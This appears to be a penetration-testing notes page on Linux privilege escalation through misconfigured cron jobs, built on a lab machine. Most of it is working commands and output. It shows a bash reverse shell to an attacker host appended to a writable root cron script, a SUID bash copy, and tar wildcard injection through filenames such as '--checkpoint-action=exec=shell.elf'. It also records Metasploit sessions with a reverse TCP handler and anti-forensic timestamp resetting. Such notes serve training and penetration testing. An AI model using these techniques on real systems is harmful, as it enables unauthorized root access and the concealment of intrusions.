# Cron Jobs

## 01 - Unix Shell

### 1.1 - File Permissions

After performing the Enumeration and Discovery phase for [[Cron Job|Cron Jobs]] and [[Files and Directories|Writable Folders]]

```
$ ls -l /usr/local/bin/overwrite.sh
-rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh
$ echo "bash -i >& /dev/tcp/<attacker_ip>/<LPORT> 0>&1" >> /usr/local/bin/overwrite.sh
```

You can find more [[OneLiners|One-liners]]regarding with this section

### 1.2 - PATH Environment Variable

Another way we can utilize this vulnerability is way using the same privilege escalation technique for [[Pentesting Phases/Post Exploitation/Shell Is The Beginning/Privilege Escalation/Linux/SUID and SGID|SUID and SGID]].

We create a new shell script to copy the `/bin/bash` binary and change file permissions with a sticky-bit SUID and SGID

```
$ cp /usr/local/bin/overwrite.sh /tmp/overwrite.sh.bak
$ cat overwrite.sh
#!/bin/bash  
  
cp /bin/bash /tmp/cronjob  
chmod +xs /tmp/cronjob
$ chmod +x overwrite.sh
$ ls -lah /tmp/cronjob
-rwsr-sr-x 1 root root 905K Jan 19 15:28 /tmp/cronjob
$ /tmp/cronjob -p
cronjob-4.1# whoami
root
cronjob-4.1# exit
exit
```

### 1.3 - Wildcards

#### 1.3.1 - Detect

One of the few mistakes due to negligence for not taking into account when backing things up with root privileges.

```
$ cat /usr/local/bin/compress.sh
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```

Notice the wildcard that runs with a character `*` in the home directory. If we search about the GTFOBins website to exploit the sudo privileges for the archiving program called [tar](https://gtfobins.github.io/gtfobins/tar/).

#### 1.3.2 - Exploit

Generate a payload with msfvenom and look to the [[Pentesting Phases/Initial Access/Callback Shells/MSFVenom|MSFVenom Regular Reverse Shell Payloads]] section then transfer the payload to the compromised machine and look more into [[File Transfers and Data Exfiltration]] section.

```
$ chmod +x shell.elf
$ touch /home/user/--checkpoint=1
$ touch /home/user/--checkpoint-action=exec=shell.elf
$ ls -lh
total 0
-rw-r--r-- 1 user user    0 Jan 19 15:46 --checkpoint=1
-rw-r--r-- 1 user user    0 Jan 19 15:46 --checkpoint-action=exec=shell.elf
```

#### 1.3.3 - Cleanup

Launch a reverse shell handler like netcat, msfconsole or any handler of your choosing. Once you've received a connection. Cleanup the trace you've left.

```
$ rm /home/user/shell.elf
$ rm /home/user/--checkpoint=1
$ rm /home/user/--checkpoint-action\=exec\=shell.elf
```

## 02 - Metasploit

### 2.1 - File Permissions

#### 2.1.1 - Detect

```
meterpreter > run post/linux/gather/enum_system

[+] Info:
[+]     Debian GNU/Linux 6.0
[+]     Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64 GNU/Linux
[+]     Module running as "TCM" user
..[snip]..
[*] Cron jobs stored in /root/.msf4/loot/20220523231150_default_10.10.225.219_linux.enum.syste_536783.txt
..[snip]..
```

Since metasploit fails that it uses `crontab -l` command to view the cron jobs

```
$ sudo cat /root/.msf4/loot/20220523231150_default_10.10.225.219_linux.enum.syste_536783.txt
***** Listing cron jobs for TCM *****

no crontab for TCM

meterpreter > ls /etc/crontab
100644/rw-r--r--  804  fil  2017-05-13 13:01:15 -0400  /etc/crontab
meterpreter > cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh

meterpreter > search -f overwrite.sh -d /
Found 1 result...
=================

Path                         Size (bytes)  Modified (UTC)
----                         ------------  --------------
/usr/local/bin/overwrite.sh  40            2017-05-13 09:25:35 -0400
```

#### 2.1.2 - Exploit

```
meterpreter > ls /usr/local/bin/overwrite.sh
100746/rwxr--rw-  40  fil  2017-05-13 09:25:35 -0400  /usr/local/bin/overwrite.sh
meterpreter > cat /usr/local/bin/overwrite.sh
#!/bin/bash

echo `date` > /tmp/useless
meterpreter > edit /usr/local/bin/overwrite.sh
#!/bin/bash

echo `date` > /tmp/useless
cp /bin/bash /tmp/bash; chmod +s /tmp/bash
meterpreter > ls /usr/local/bin/overwrite.sh
100746/rwxr--rw-  83  fil  2022-05-24 15:55:50 -0400  /usr/local/bin/overwrite.sh
meterpreter > shell -t
[*] env TERM=xterm HISTFILE= /usr/bin/script -qc /bin/bash /dev/null
Process 2338 created.
Channel 6 created.
TCM@debian:~$ /tmp/bash -p
/tmp/bash -p
bash-4.1# id
id
uid=1000(TCM) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
```

#### 2.1.3 - Cleanup

```
bash-4.1# ^Z
Background channel 14? [y/N]  y
meterpreter > pwd
/home/user
meterpreter > upload rsh_x64
[*] uploading  : /home/user/Documents/thm/rsh_x64 -> rsh_x64
[*] Uploaded -1.00 B of 250.00 B (-0.4%): /home/user/Documents/thm/rsh_x64 -> rsh_x64
[*] uploaded   : /home/user/Documents/thm/rsh_x64 -> rsh_x64
meterpreter > chmod 777 rsh_x64
meterpreter > bg
[*] Backgrounding session 2...
msf6 auxiliary(scanner/ssh/ssh_login) > handler -p linux/x64/meterpreter/reverse_tcp -H 10.8.145.108 -P 53
[*] Payload handler running as background job 1.

[*] Started reverse TCP handler on 10.8.145.108:53
msf6 auxiliary(scanner/ssh/ssh_login) > sessions -1
[*] Starting interaction with 2...

meterpreter > channel -i 16
Interacting with channel 16...

bash-4.1# ./rsh_x64

[*] Sending stage (3020772 bytes) to 10.10.166.166
./rsh_x64
[*] Meterpreter session 4 opened (10.8.145.108:53 -> 10.10.166.166:54489) at 2022-05-24 16:07:03 -0400
^Z
Background channel 16? [y/N]  y
meterpreter > sessions -1
[*] Backgrounding session 2...
[*] Starting interaction with 4...

meterpreter > getuid
Server username: root
meterpreter > edit /usr/local/bin/overwrite.sh
#!/bin/bash  
  
echo `date` > /tmp/useless
meterpreter > shell -t
[*] env TERM=xterm HISTFILE= /usr/bin/script -qc /bin/bash /dev/null
Process 2529 created.
Channel 4 created.
bash-4.1$ su root
su root
Password: password123

root@debian:/home/user# touch -touch -amtd "2017-05-13 09:25:35" /usr/local/bin/overwrite.sh
touch -d "2017-05-13 09:25:35" /usr/local/bin/overwrite.sh
root@debian:/home/user# ls -lh /usr/local/bin/overwrite.sh
ls -lh /usr/local/bin/overwrite.sh
-rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh
root@debian:/home/user# exit
exit
exit
bash-4.1$ exit
exit
exit
meterpreter > ls /usr/local/bin/overwrite.sh
100746/rwxr--rw-  40  fil  2017-05-13 09:25:35 -0400  /usr/local/bin/overwrite.sh
bash-4.1# exit
exit
exit
TCM@debian:~$ exit
exit
exit
meterpreter > rm /tmp/bash
```

## References

- [Linux Privilege Escalation by Exploiting Cron Jobs](https://www.hackingarticles.in/linux-privilege-escalation-by-exploiting-cron-jobs/)

- [Crontab.guru](https://crontab.guru)